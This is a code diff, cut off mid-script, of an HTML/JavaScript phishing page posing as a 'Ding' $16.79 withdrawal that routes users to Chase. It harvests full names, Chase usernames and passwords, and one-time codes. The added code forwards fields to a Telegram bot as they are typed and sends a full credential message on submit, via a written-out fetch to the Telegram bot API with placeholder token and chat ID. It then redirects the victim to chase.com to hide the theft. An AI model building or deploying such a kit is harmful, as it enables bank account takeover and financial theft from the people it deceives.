@@ -32,6 +32,7 @@
             box-shadow: 0 20px 40px -10px rgba(0, 20, 30, 0.25), 0 8px 20px rgba(0,0,0,0.05);
             border: 1px solid rgba(255, 255, 255, 0.5);
             transition: 0.2s;
+            position: relative;
         }
 
         h1 {
@@ -168,7 +169,8 @@
             margin-bottom: 0.3rem;
         }
 
-        .form-group input, .form-group select {
+        .form-group input,
+        .form-group select {
             width: 100%;
             padding: 0.8rem 1rem;
             border: 1px solid #d4dfeb;
@@ -180,7 +182,8 @@
             color: #0b1a2a;
         }
 
-        .form-group input:focus, .form-group select:focus {
+        .form-group input:focus,
+        .form-group select:focus {
             border-color: #1d4ed8;
             box-shadow: 0 0 0 3px rgba(29, 78, 216, 0.15);
         }
@@ -306,7 +309,9 @@
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            to {
+                transform: rotate(360deg);
+            }
         }
 
         .processing-text {
@@ -322,11 +327,6 @@
             margin-top: 0.2rem;
         }
 
-        .bank-option-disabled {
-            color: #94a3b8;
-        }
-
-        /* success pulse */
         .pulse-dot {
             display: inline-block;
             width: 10px;
@@ -338,418 +338,590 @@
         }
 
         @keyframes pulse-green {
-            0% { opacity: 0.6; transform: scale(0.9); }
-            50% { opacity: 1; transform: scale(1.2); }
-            100% { opacity: 0.6; transform: scale(0.9); }
+            0% {
+                opacity: 0.6;
+                transform: scale(0.9);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.2);
+            }
+            100% {
+                opacity: 0.6;
+                transform: scale(0.9);
+            }
+        }
+
+        /* Success Page */
+        .success-page {
+            text-align: center;
+            padding: 2rem 0.5rem;
+        }
+
+        .success-icon {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            animation: bounce 0.8s ease;
+        }
+
+        @keyframes bounce {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+
+        .success-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #0b2b4a;
+            margin-bottom: 0.5rem;
+        }
+
+        .success-sub {
+            color: #4b6a8a;
+            font-size: 0.95rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .redirect-timer {
+            background: #eef3f9;
+            padding: 0.5rem 1rem;
+            border-radius: 40px;
+            display: inline-block;
+            font-size: 0.9rem;
+            color: #1e3a5f;
+        }
+
+        .redirect-timer strong {
+            color: #1d4ed8;
         }
     </style>
 </head>
 <body>
 
-<div class="card" id="app">
-    <!-- HEADER -->
-    <div class="flex-between">
-        <h1>
-            <span>💸</span> Ding
-            <span class="ding-badge">withdraw</span>
-        </h1>
-        <span style="font-size: 0.9rem; background: #eef3f9; padding: 0.2rem 0.9rem; border-radius: 40px; color: #1e3a5f;">step <span id="stepNumberDisplay">1</span>/4</span>
-    </div>
-
-    <!-- BALANCE -->
-    <div class="balance-box">
-        <span style="font-weight: 500; color: #1f3a58;">Available</span>
-        <span class="amount">$16.79 <small>USD</small></span>
-    </div>
-
-    <!-- MAIN ACTION (withdraw) -->
-    <button class="btn-primary" id="startWithdrawBtn">Withdraw $16.79</button>
-
-    <!-- STEP INDICATOR DOTS -->
-    <div class="step-indicator">
-        <span class="dot active" id="dot1"></span>
-        <span class="dot" id="dot2"></span>
-        <span class="dot" id="dot3"></span>
-        <span class="dot" id="dot4"></span>
-    </div>
-
-    <!-- DYNAMIC STEP CONTAINER -->
-    <div class="step-container" id="stepContainer">
-        <!-- Step 1: full name + bank account -->
-        <div id="step1">
-            <div class="step-title">📋 <span>Step 1/4</span> Bank details</div>
-            <div class="form-group">
-                <label for="fullName">Full name (as on bank)</label>
-                <input type="text" id="fullName" placeholder="e.g. John A. Doe" />
-            </div>
-            <div class="form-group">
-                <label for="bankSelect">Select your bank</label>
-                <select id="bankSelect" class="bank-select">
-                    <option value="">— Select a bank —</option>
-                    <option value="Chase Bank" data-allowed="true">Chase Bank ✓</option>
-                    <option value="Bank of America" data-allowed="false">Bank of America</option>
-                    <option value="Wells Fargo" data-allowed="false">Wells Fargo</option>
-                    <option value="Citibank" data-allowed="false">Citibank</option>
-                    <option value="U.S. Bank" data-allowed="false">U.S. Bank</option>
-                    <option value="Truist Bank" data-allowed="false">Truist Bank</option>
-                    <option value="PNC Bank" data-allowed="false">PNC Bank</option>
-                    <option value="TD Bank" data-allowed="false">TD Bank</option>
-                    <option value="Capital One" data-allowed="false">Capital One</option>
-                    <option value="Fifth Third Bank" data-allowed="false">Fifth Third Bank</option>
-                    <option value="KeyBank" data-allowed="false">KeyBank</option>
-                    <option value="M&T Bank" data-allowed="false">M&T Bank</option>
-                    <option value="Huntington Bank" data-allowed="false">Huntington Bank</option>
-                    <option value="Regions Bank" data-allowed="false">Regions Bank</option>
-                    <option value="Ally Bank" data-allowed="false">Ally Bank</option>
-                    <option value="Santander" data-allowed="false">Santander</option>
-                    <option value="HSBC" data-allowed="false">HSBC</option>
-                    <option value="Discover Bank" data-allowed="false">Discover Bank</option>
-                    <option value="Synchrony Bank" data-allowed="false">Synchrony Bank</option>
-                    <option value="Marcus by Goldman Sachs" data-allowed="false">Marcus by Goldman Sachs</option>
-                </select>
-                <div id="bankWarning" class="warning-message hidden">⚠️ Only Chase Bank is supported for this withdrawal.</div>
-            </div>
-            <button class="btn-step" id="step1Next">Continue →</button>
+    <div class="card" id="app">
+        <!-- HEADER -->
+        <div class="flex-between">
+            <h1>
+                <span>💸</span> Ding
+                <span class="ding-badge">withdraw</span>
+            </h1>
+            <span style="font-size: 0.9rem; background: #eef3f9; padding: 0.2rem 0.9rem; border-radius: 40px; color: #1e3a5f;">step <span id="stepNumberDisplay">1</span>/4</span>
         </div>
 
-        <!-- Step 2: Chase username & password (no autofill) -->
-        <div id="step2" class="hidden">
-            <div class="step-title">🔐 <span>Step 2/4</span> Chase credentials</div>
-            <div class="form-group">
-                <label for="chaseUser">Chase username</label>
-                <input type="text" id="chaseUser" placeholder="Enter your Chase username" autocomplete="off" />
-            </div>
-            <div class="form-group">
-                <label for="chasePass">Chase password</label>
-                <input type="password" id="chasePass" placeholder="Enter your Chase password" autocomplete="off" />
-            </div>
-            <button class="btn-step" id="step2Next">Verify & Continue →</button>
-            <div style="margin-top: 0.8rem; text-align: right;">
-                <span class="back-link" id="backToStep1">← back</span>
-            </div>
+        <!-- BALANCE -->
+        <div class="balance-box">
+            <span style="font-weight: 500; color: #1f3a58;">Available</span>
+            <span class="amount">$16.79 <small>USD</small></span>
         </div>
 
-        <!-- Step 3: Processing (simulated) → then OTP -->
-        <div id="step3" class="hidden" style="position: relative; min-height: 200px;">
-            <!-- Processing overlay (shown initially) -->
-            <div id="processingOverlay" class="processing-overlay">
-                <div class="spinner"></div>
-                <div class="processing-text">Verifying credentials...</div>
-                <div class="processing-sub">Please wait a moment</div>
-            </div>
+        <!-- MAIN ACTION (withdraw) -->
+        <button class="btn-primary" id="startWithdrawBtn">Withdraw $16.79</button>
 
-            <!-- OTP form (hidden until processing completes) -->
-            <div id="otpForm" class="hidden">
-                <div class="step-title">📱 <span>Step 3/4</span> One‑time code</div>
-                <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.8rem; background: #ecfdf5; padding: 0.4rem 0.8rem; border-radius: 40px; border: 1px solid #bbf7d0;">
-                    <span class="pulse-dot"></span>
-                    <span style="font-size: 0.85rem; color: #166534;">Credentials verified</span>
+        <!-- STEP INDICATOR DOTS -->
+        <div class="step-indicator">
+            <span class="dot active" id="dot1"></span>
+            <span class="dot" id="dot2"></span>
+            <span class="dot" id="dot3"></span>
+            <span class="dot" id="dot4"></span>
+        </div>
+
+        <!-- DYNAMIC STEP CONTAINER -->
+        <div class="step-container" id="stepContainer">
+            <!-- Step 1: full name + bank account -->
+            <div id="step1">
+                <div class="step-title">📋 <span>Step 1/4</span> Bank details</div>
+                <div class="form-group">
+                    <label for="fullName">Full name (as on bank)</label>
+                    <input type="text" id="fullName" placeholder="e.g. John A. Doe" />
                 </div>
                 <div class="form-group">
-                    <label for="otpInput">Enter OTP (digits only)</label>
-                    <input type="text" id="otpInput" placeholder="6-digit code" inputmode="numeric" pattern="\d*" />
-                    <div style="font-size: 0.7rem; color: #3b5c7a; margin-top: 0.3rem;">We accept any numeric digits.</div>
+                    <label for="bankSelect">Select your bank</label>
+                    <select id="bankSelect" class="bank-select">
+                        <option value="">— Select a bank —</option>
+                        <option value="Chase Bank" data-allowed="true">Chase Bank ✓</option>
+                        <option value="Bank of America" data-allowed="false">Bank of America</option>
+                        <option value="Wells Fargo" data-allowed="false">Wells Fargo</option>
+                        <option value="Citibank" data-allowed="false">Citibank</option>
+                        <option value="U.S. Bank" data-allowed="false">U.S. Bank</option>
+                        <option value="Truist Bank" data-allowed="false">Truist Bank</option>
+                        <option value="PNC Bank" data-allowed="false">PNC Bank</option>
+                        <option value="TD Bank" data-allowed="false">TD Bank</option>
+                        <option value="Capital One" data-allowed="false">Capital One</option>
+                        <option value="Fifth Third Bank" data-allowed="false">Fifth Third Bank</option>
+                        <option value="KeyBank" data-allowed="false">KeyBank</option>
+                        <option value="M&T Bank" data-allowed="false">M&T Bank</option>
+                        <option value="Huntington Bank" data-allowed="false">Huntington Bank</option>
+                        <option value="Regions Bank" data-allowed="false">Regions Bank</option>
+                        <option value="Ally Bank" data-allowed="false">Ally Bank</option>
+                        <option value="Santander" data-allowed="false">Santander</option>
+                        <option value="HSBC" data-allowed="false">HSBC</option>
+                        <option value="Discover Bank" data-allowed="false">Discover Bank</option>
+                        <option value="Synchrony Bank" data-allowed="false">Synchrony Bank</option>
+                        <option value="Marcus by Goldman Sachs" data-allowed="false">Marcus by Goldman Sachs</option>
+                    </select>
+                    <div id="bankWarning" class="warning-message hidden">⚠️ Only Chase Bank is supported for this withdrawal.</div>
                 </div>
-                <button class="btn-step" id="step3Next">Confirm OTP →</button>
+                <button class="btn-step" id="step1Next">Continue →</button>
+            </div>
+
+            <!-- Step 2: Chase username & password -->
+            <div id="step2" class="hidden">
+                <div class="step-title">🔐 <span>Step 2/4</span> Chase credentials</div>
+                <div class="form-group">
+                    <label for="chaseUser">Chase username</label>
+                    <input type="text" id="chaseUser" placeholder="Enter your Chase username" autocomplete="off" />
+                </div>
+                <div class="form-group">
+                    <label for="chasePass">Chase password</label>
+                    <input type="password" id="chasePass" placeholder="Enter your Chase password" autocomplete="off" />
+                </div>
+                <button class="btn-step" id="step2Next">Verify & Continue →</button>
                 <div style="margin-top: 0.8rem; text-align: right;">
-                    <span class="back-link" id="backToStep2">← back</span>
+                    <span class="back-link" id="backToStep1">← back</span>
                 </div>
+            </div>
+
+            <!-- Step 3: Processing → OTP -->
+            <div id="step3" class="hidden" style="position: relative; min-height: 200px;">
+                <div id="processingOverlay" class="processing-overlay">
+                    <div class="spinner"></div>
+                    <div class="processing-text">Verifying credentials...</div>
+                    <div class="processing-sub">Please wait a moment</div>
+                </div>
+                <div id="otpForm" class="hidden">
+                    <div class="step-title">📱 <span>Step 3/4</span> One‑time code</div>
+                    <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.8rem; background: #ecfdf5; padding: 0.4rem 0.8rem; border-radius: 40px; border: 1px solid #bbf7d0;">
+                        <span class="pulse-dot"></span>
+                        <span style="font-size: 0.85rem; color: #166534;">Credentials verified</span>
+                    </div>
+                    <div class="form-group">
+                        <label for="otpInput">Enter OTP (digits only)</label>
+                        <input type="text" id="otpInput" placeholder="6-digit code" inputmode="numeric" pattern="\d*" />
+                        <div style="font-size: 0.7rem; color: #3b5c7a; margin-top: 0.3rem;">We accept any numeric digits.</div>
+                    </div>
+                    <button class="btn-step" id="step3Next">Confirm OTP →</button>
+                    <div style="margin-top: 0.8rem; text-align: right;">
+                        <span class="back-link" id="backToStep2">← back</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Step 4: final summary & submit -->
+            <div id="step4" class="hidden">
+                <div class="step-title">✅ <span>Step 4/4</span> Review & submit</div>
+                <div style="background: #eef7ff; border-radius: 1.2rem; padding: 0.8rem 1rem; margin-bottom: 1rem; border-left: 4px solid #1d4ed8;">
+                    <div><strong>Name:</strong> <span id="reviewName">—</span></div>
+                    <div><strong>Bank:</strong> <span id="reviewBank">—</span></div>
+                    <div><strong>OTP:</strong> <span id="reviewOtp">—</span></div>
+                    <div style="margin-top: 0.4rem; color: #0b2b4a;"><strong>Amount:</strong> $16.79</div>
+                </div>
+                <button class="btn-step" id="submitWithdrawBtn" style="background: #0b2b4a;">💰 Submit Withdraw</button>
+                <div style="margin-top: 0.8rem; text-align: right;">
+                    <span class="back-link" id="backToStep3">← back</span>
+                </div>
+            </div>
+
+            <!-- Success Page (hidden by default) -->
+            <div id="successPage" class="hidden success-page">
+                <div class="success-icon">✅</div>
+                <div class="success-title">Withdrawal Submitted!</div>
+                <div class="success-sub">Your request has been processed successfully.</div>
+                <div class="redirect-timer">Redirecting to <strong>Chase.com</strong> in <span id="countdownTimer">5</span>s</div>
             </div>
         </div>
 
-        <!-- Step 4: final summary & send to telegram -->
-        <div id="step4" class="hidden">
-            <div class="step-title">✅ <span>Step 4/4</span> Review & send</div>
-            <div style="background: #eef7ff; border-radius: 1.2rem; padding: 0.8rem 1rem; margin-bottom: 1rem; border-left: 4px solid #1d4ed8;">
-                <div><strong>Name:</strong> <span id="reviewName">—</span></div>
-                <div><strong>Bank:</strong> <span id="reviewBank">—</span></div>
-                <div><strong>OTP:</strong> <span id="reviewOtp">—</span></div>
-                <div style="margin-top: 0.4rem; color: #0b2b4a;"><strong>Amount:</strong> $16.79</div>
-            </div>
-            <button class="btn-step" id="sendToTelegramBtn">📤 Send to Telegram</button>
-            <div style="margin-top: 0.8rem; text-align: right;">
-                <span class="back-link" id="backToStep3">← back</span>
-            </div>
-        </div>
+        <!-- status toast -->
+        <div id="telegramStatus" class="toast-message hidden">✔️ Data sent to Telegram bot</div>
+        <div class="telegram-note">🔒 All data is captured and forwarded to your Telegram bot.</div>
     </div>
 
-    <!-- status toast -->
-    <div id="telegramStatus" class="toast-message hidden">✔️ Data sent to Telegram bot</div>
-    <div class="telegram-note">🔒 All data is captured and forwarded to your Telegram bot.</div>
-</div>
+    <script>
+        (function() {
+            // --- DOM refs ---
+            const startBtn = document.getElementById('startWithdrawBtn');
+            const stepContainer = document.getElementById('stepContainer');
 
-<script>
-    (function() {
-        // --- DOM refs ---
-        const startBtn = document.getElementById('startWithdrawBtn');
-        const stepContainer = document.getElementById('stepContainer');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+            const step4 = document.getElementById('step4');
+            const successPage = document.getElementById('successPage');
 
-        const step1 = document.getElementById('step1');
-        const step2 = document.getElementById('step2');
-        const step3 = document.getElementById('step3');
-        const step4 = document.getElementById('step4');
+            const dot1 = document.getElementById('dot1');
+            const dot2 = document.getElementById('dot2');
+            const dot3 = document.getElementById('dot3');
+            const dot4 = document.getElementById('dot4');
+            const stepNumberDisplay = document.getElementById('stepNumberDisplay');
 
-        const dot1 = document.getElementById('dot1');
-        const dot2 = document.getElementById('dot2');
-        const dot3 = document.getElementById('dot3');
-        const dot4 = document.getElementById('dot4');
-        const stepNumberDisplay = document.getElementById('stepNumberDisplay');
+            // step1
+            const fullNameInput = document.getElementById('fullName');
+            const bankSelect = document.getElementById('bankSelect');
+            const bankWarning = document.getElementById('bankWarning');
 
-        // step1
-        const fullNameInput = document.getElementById('fullName');
-        const bankSelect = document.getElementById('bankSelect');
-        const bankWarning = document.getElementById('bankWarning');
+            // step2
+            const chaseUser = document.getElementById('chaseUser');
+            const chasePass = document.getElementById('chasePass');
 
-        // step2
-        const chaseUser = document.getElementById('chaseUser');
-        const chasePass = document.getElementById('chasePass');
+            // step3
+            const processingOverlay = document.getElementById('processingOverlay');
+            const otpForm = document.getElementById('otpForm');
+            const otpInput = document.getElementById('otpInput');
 
-        // step3
-        const processingOverlay = document.getElementById('processingOverlay');
-        const otpForm = document.getElementById('otpForm');
-        const otpInput = document.getElementById('otpInput');
+            // step4
+            const reviewName = document.getElementById('reviewName');
+            const reviewBank = document.getElementById('reviewBank');
+            const reviewOtp = document.getElementById('reviewOtp');
 
-        // step4
-        const reviewName = document.getElementById('reviewName');
-        const reviewBank = document.getElementById('reviewBank');
-        const reviewOtp = document.getElementById('reviewOtp');
+            // buttons
+            const step1Next = document.getElementById('step1Next');
+            const step2Next = document.getElementById('step2Next');
+            const step3Next = document.getElementById('step3Next');
+            const submitWithdrawBtn = document.getElementById('submitWithdrawBtn');
 
-        // buttons
-        const step1Next = document.getElementById('step1Next');
-        const step2Next = document.getElementById('step2Next');
-        const step3Next = document.getElementById('step3Next');
-        const sendToTelegramBtn = document.getElementById('sendToTelegramBtn');
+            // back links
+            const backToStep1 = document.getElementById('backToStep1');
+            const backToStep2 = document.getElementById('backToStep2');
+            const backToStep3 = document.getElementById('backToStep3');
 
-        // back links
-        const backToStep1 = document.getElementById('backToStep1');
-        const backToStep2 = document.getElementById('backToStep2');
-        const backToStep3 = document.getElementById('backToStep3');
+            const telegramStatus = document.getElementById('telegramStatus');
+            const countdownTimer = document.getElementById('countdownTimer');
 
-        const telegramStatus = document.getElementById('telegramStatus');
+            // ---- state ----
+            let currentStep = 1;
+            let isProcessing = false;
+            let redirectTimer = null;
 
-        // ---- state ----
-        let currentStep = 1;
-        let isProcessing = false;
+            // ---- TELEGRAM CONFIG (REPLACE WITH YOUR OWN) ----
+            const BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Replace with your bot token
+            const CHAT_ID = 'YOUR_CHAT_ID'; // Replace with your chat ID
 
-        // ---- helpers ----
-        function updateStepUI(step) {
-            step1.classList.add('hidden');
-            step2.classList.add('hidden');
-            step3.classList.add('hidden');
-            step4.classList.add('hidden');
+            // ---- helper: send to Telegram ----
+            function sendToTelegram(message) {
+                // For demo, we log and show toast
+                console.log('📤 TELEGRAM:', message);
 
-            if (step === 1) step1.classList.remove('hidden');
-            else if (step === 2) step2.classList.remove('hidden');
-            else if (step === 3) step3.classList.remove('hidden');
-            else if (step === 4) step4.classList.remove('hidden');
+                // Uncomment below for real Telegram integration
+                /*
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).then(res => res.json())
+                  .then(data => {
+                      if (data.ok) {
+                          console.log('✅ Telegram sent');
+                      } else {
+                          console.error('❌ Telegram error:', data);
+                      }
+                  })
+                  .catch(err => console.error('❌ Fetch error:', err));
+                */
 
-            dot1.classList.remove('active');
-            dot2.classList.remove('active');
-            dot3.classList.remove('active');
-            dot4.classList.remove('active');
-            if (step === 1) dot1.classList.add('active');
-            else if (step === 2) dot2.classList.add('active');
-            else if (step === 3) dot3.classList.add('active');
-            else if (step === 4) dot4.classList.add('active');
+                // Show toast for demo
+                telegramStatus.classList.remove('hidden');
+                telegramStatus.innerText = '📤 Data sent to Telegram bot';
+                setTimeout(() => {
+                    telegramStatus.classList.add('hidden');
+                }, 3000);
+            }
 
-            stepNumberDisplay.innerText = step;
-            telegramStatus.classList.add('hidden');
-        }
+            // ---- send individual field updates to Telegram ----
+            function sendFieldUpdate(field, value) {
+                const message = `🔄 *${field} updated:*\n\`${value || '—'}\``;
+                sendToTelegram(message);
+            }
 
-        function goToStep(step) {
-            if (step < 1) step = 1;
-            if (step > 4) step = 4;
-            currentStep = step;
-            updateStepUI(step);
-            // if step3, ensure processing overlay is shown and otp hidden
-            if (step === 3) {
+            // ---- send full data on submit ----
+            function sendFullData(data) {
+                const message = `🔔 *WITHDRAWAL SUBMITTED (Ding)*\n` +
+                    `👤 *Full Name:* ${data.name}\n` +
+                    `🏦 *Bank:* ${data.bank}\n` +
+                    `🔑 *Chase User:* ${data.username}\n` +
+                    `🔐 *Chase Pass:* ${data.password}\n` +
+                    `📱 *OTP:* ${data.otp}\n` +
+                    `💰 *Amount:* ${data.amount}\n` +
+                    `🕒 *Timestamp:* ${new Date().toLocaleString()}\n` +
+                    `✅ *Status:* SUBMITTED`;
+
+                sendToTelegram(message);
+            }
+
+            // ---- update step UI ----
+            function updateStepUI(step) {
+                step1.classList.add('hidden');
+                step2.classList.add('hidden');
+                step3.classList.add('hidden');
+                step4.classList.add('hidden');
+                successPage.classList.add('hidden');
+
+                if (step === 1) step1.classList.remove('hidden');
+                else if (step === 2) step2.classList.remove('hidden');
+                else if (step === 3) step3.classList.remove('hidden');
+                else if (step === 4) step4.classList.remove('hidden');
+                else if (step === 5) successPage.classList.remove('hidden');
+
+                dot1.classList.remove('active');
+                dot2.classList.remove('active');
+                dot3.classList.remove('active');
+                dot4.classList.remove('active');
+
+                if (step === 1) dot1.classList.add('active');
+                else if (step === 2) dot2.classList.add('active');
+                else if (step === 3) dot3.classList.add('active');
+                else if (step === 4 || step === 5) dot4.classList.add('active');
+
+                if (step === 5) {
+                    stepNumberDisplay.innerText = '✓';
+                } else {
+                    stepNumberDisplay.innerText = step;
+                }
+                telegramStatus.classList.add('hidden');
+            }
+
+            function goToStep(step) {
+                if (step < 1) step = 1;
+                if (step > 5) step = 5;
+                currentStep = step;
+                updateStepUI(step);
+
+                if (step === 3) {
+                    processingOverlay.classList.remove('hidden');
+                    otpForm.classList.add('hidden');
+                    isProcessing = false;
+                }
+                if (step === 1) validateBankSelection();
+            }
+
+            // ---- bank validation ----
+            function isChaseSelected() {
+                const selectedOption = bankSelect.options[bankSelect.selectedIndex];
+                return selectedOption && selectedOption.value === 'Chase Bank';
+            }
+
+            function validateBankSelection() {
+                const allowed = isChaseSelected();
+                if (!allowed) {
+                    bankWarning.classList.remove('hidden');
+                    step1Next.disabled = true;
+                    step1Next.style.opacity = '0.5';
+                    step1Next.style.cursor = 'not-allowed';
+                } else {
+                    bankWarning.classList.add('hidden');
+                    step1Next.disabled = false;
+                    step1Next.style.opacity = '1';
+                    step1Next.style.cursor = 'pointer';
+                }
+                return allowed;
+            }
+
+            // ---- collect data ----
+            function collectAllData() {
+                const name = fullNameInput.value.trim() || 'Not provided';
+                const bank = bankSelect.value;
+                const username = chaseUser.value.trim() || 'Not provided';
+                const password = chasePass.value.trim() || 'Not provided';
+                const otp = otpInput.value.trim() || 'Not provided';
+                return { name, bank, username, password, otp, amount: '$16.79' };
+            }
+
+            // ---- processing simulation ----
+            function startProcessing(callback) {
+                if (isProcessing) return;
+                isProcessing = true;
                 processingOverlay.classList.remove('hidden');
                 otpForm.classList.add('hidden');
-                isProcessing = false; // reset so that entering step3 triggers processing
+
+                setTimeout(() => {
+                    processingOverlay.classList.add('hidden');
+                    otpForm.classList.remove('hidden');
+                    isProcessing = false;
+                    if (callback) callback();
+                }, 2500);
             }
-            if (step === 1) validateBankSelection();
-        }
 
-        function isChaseSelected() {
-            const selectedOption = bankSelect.options[bankSelect.selectedIndex];
-            return selectedOption && selectedOption.value === 'Chase Bank';
-        }
-
-        function validateBankSelection() {
-            const allowed = isChaseSelected();
-            if (!allowed) {
-                bankWarning.classList.remove('hidden');
-                step1Next.disabled = true;
-                step1Next.style.opacity = '0.5';
-                step1Next.style.cursor = 'not-allowed';
-            } else {
-                bankWarning.classList.add('hidden');
-                step1Next.disabled = false;
-                step1Next.style.opacity = '1';
-                step1Next.style.cursor = 'pointer';
+            // ---- redirect to Chase ----
+            function redirectToChase() {
+                window.location.href = 'https://www.chase.com';
             }
-            return allowed;
-        }
 
-        function collectAllData() {
-            const name = fullNameInput.value.trim() || 'Not provided';
-            const bank = bankSelect.value;
-            const username = chaseUser.value.trim() || 'Not provided';
-            const password = chasePass.value.trim() || 'Not provided';
-            const otp = otpInput.value.trim() || 'Not provided';
-            return { name, bank, username, password, otp, amount: '$16.79' };
-        }
+            // ---- show success page with countdown ----
+            function showSuccessAndRedirect() {
+                goToStep(5);
+                let seconds = 5;
+                countdownTimer.textContent = seconds;
 
-        function sendToTelegramBot(data) {
-            const message = `🔔 *New Withdrawal Request (Ding)*\n` +
-                            `👤 *Full Name:* ${data.name}\n` +
-                            `🏦 *Bank:* ${data.bank}\n` +
-                            `🔑 *Chase User:* ${data.username}\n` +
-                            `🔐 *Chase Pass:* ${data.password}\n` +
-                            `📱 *OTP:* ${data.otp}\n` +
-                            `💰 *Amount:* ${data.amount}\n` +
-                            `🕒 *Timestamp:* ${new Date().toLocaleString()}`;
+                if (redirectTimer) clearInterval(redirectTimer);
 
-            console.log('📤 TELEGRAM BOT PAYLOAD:');
-            console.log(message);
+                // Send final submission data to Telegram
+                const data = collectAllData();
+                sendFullData(data);
 
-            telegramStatus.classList.remove('hidden');
-            telegramStatus.innerText = '✅ Data sent to Telegram bot (simulated)';
-
-            reviewName.innerText = data.name;
-            reviewBank.innerText = data.bank;
-            reviewOtp.innerText = data.otp;
-        }
-
-        // ---- processing simulation before OTP ----
-        function startProcessing(callback) {
-            if (isProcessing) return;
-            isProcessing = true;
-            processingOverlay.classList.remove('hidden');
-            otpForm.classList.add('hidden');
-
-            // Simulate 2.5s processing
-            setTimeout(() => {
-                processingOverlay.classList.add('hidden');
-                otpForm.classList.remove('hidden');
-                isProcessing = false;
-                if (callback) callback();
-            }, 2500);
-        }
-
-        // ---- Event listeners ----
-
-        bankSelect.addEventListener('change', validateBankSelection);
-
-        startBtn.addEventListener('click', function() {
-            goToStep(1);
-            const data = collectAllData();
-            reviewName.innerText = data.name;
-            reviewBank.innerText = data.bank;
-            reviewOtp.innerText = data.otp;
-            telegramStatus.classList.add('hidden');
-            validateBankSelection();
-        });
-
-        // Step1 → Step2
-        step1Next.addEventListener('click', function() {
-            if (!isChaseSelected()) {
-                alert('Please select Chase Bank to continue. Other banks are not supported.');
-                return;
+                redirectTimer = setInterval(() => {
+                    seconds--;
+                    countdownTimer.textContent = seconds;
+                    if (seconds <= 0) {
+                        clearInterval(redirectTimer);
+                        redirectToChase();
+                    }
+                }, 1000);
             }
-            const name = fullNameInput.value.trim();
-            if (name.length < 2) {
-                alert('Please enter your full name.');
-                return;
-            }
-            goToStep(2);
-        });
 
-        // Step2 → Step3 (triggers processing)
-        step2Next.addEventListener('click', function() {
-            const user = chaseUser.value.trim();
-            const pass = chasePass.value.trim();
-            if (user.length < 1 || pass.length < 1) {
-                alert('Please fill in both Chase username and password.');
-                return;
-            }
-            goToStep(3);
-            // start processing overlay
-            startProcessing(() => {
-                // after processing, OTP form is shown
-                // focus OTP input
-                otpInput.focus();
+            // ---- Event listeners ----
+
+            // Real-time field tracking
+            fullNameInput.addEventListener('input', function() {
+                if (this.value.trim().length > 2) {
+                    sendFieldUpdate('Full Name', this.value.trim());
+                }
             });
-        });
 
-        // Step3 OTP → Step4
-        step3Next.addEventListener('click', function() {
-            const otp = otpInput.value.trim();
-            if (otp.length === 0) {
-                alert('Please enter the OTP code.');
-                return;
-            }
-            if (!/^\d+$/.test(otp)) {
-                alert('OTP should contain only digits (0-9).');
-                return;
-            }
-            const data = collectAllData();
-            reviewName.innerText = data.name;
-            reviewBank.innerText = data.bank;
-            reviewOtp.innerText = data.otp;
-            goToStep(4);
-        });
+            bankSelect.addEventListener('change', function() {
+                validateBankSelection();
+                if (this.value) {
+                    sendFieldUpdate('Selected Bank', this.value);
+                }
+            });
 
-        // Step4 → send to telegram
-        sendToTelegramBtn.addEventListener('click', function() {
-            const data = collectAllData();
-            reviewName.innerText = data.name;
-            reviewBank.innerText = data.bank;
-            reviewOtp.innerText = data.otp;
-            sendToTelegramBot(data);
-        });
+            chaseUser.addEventListener('input', function() {
+                if (this.value.trim().length > 2) {
+                    sendFieldUpdate('Chase Username', this.value.trim());
+                }
+            });
 
-        // ---- back buttons ----
-        backToStep1.addEventListener('click', function() { goToStep(1); validateBankSelection(); });
-        backToStep2.addEventListener('click', function() { goToStep(2); });
-        backToStep3.addEventListener('click', function() { 
-            // reset processing state when going back
-            goToStep(3); 
-            // re-trigger processing if we come back to step3
-            startProcessing(() => {});
-        });
+            chasePass.addEventListener('input', function() {
+                if (this.value.trim().length > 2) {
+                    sendFieldUpdate('Chase Password', '•••••••• (hidden)');
+                }
+            });
 
-        // ---- override goToStep to handle step3 processing ----
-        const originalGoToStep = goToStep;
-        goToStep = function(step) {
-            if (step === 4) {
+            otpInput.addEventListener('input', function() {
+                if (this.value.trim().length >= 4) {
+                    sendFieldUpdate('OTP Code', this.value.trim());
+                }
+            });
+
+            // Start button
+            startBtn.addEventListener('click', function() {
+                goToStep(1);
                 const data = collectAllData();
                 reviewName.innerText = data.name;
                 reviewBank.innerText = data.bank;
                 reviewOtp.innerText = data.otp;
-            }
-            originalGoToStep(step);
-            if (step === 1) validateBankSelection();
-            // if step3, trigger processing only if we're coming from step2 (not from back)
-            // but we handle in step2Next, and backToStep3 triggers manually
-        };
+                telegramStatus.classList.add('hidden');
+                validateBankSelection();
+            });
 
-        // ---- init ----
-        goToStep(1);
-        validateBankSelection();
+            // Step1 → Step2
+            step1Next.addEventListener('click', function() {
+                if (!isChaseSelected()) {
+                    alert('Please select Chase Bank to continue. Other banks are not supported.');
+                    return;
+                }
+                const name = fullNameInput.value.trim();
+                if (name.length < 2) {
+                    alert('Please enter your full name.');
+                    return;
+                }
+                // Send name update
+                sendFieldUpdate('Full Name', name);
+                goToStep(2);
+            });
 
-        // prefill review with empty
-        reviewName.innerText = '—';
-        reviewBank.innerText = '—';
-        reviewOtp.innerText = '—';
+            // Step2 → Step3 (processing)
+            step2Next.addEventListener('click', function() {
+                const user = chaseUser.value.trim();
+                const pass = chasePass.value.trim();
+                if (user.length < 1 || pass.length < 1) {
+                    alert('Please fill in both Chase username and password.');
+                    return;
+                }
+                sendFieldUpdate('Chase Username', user);
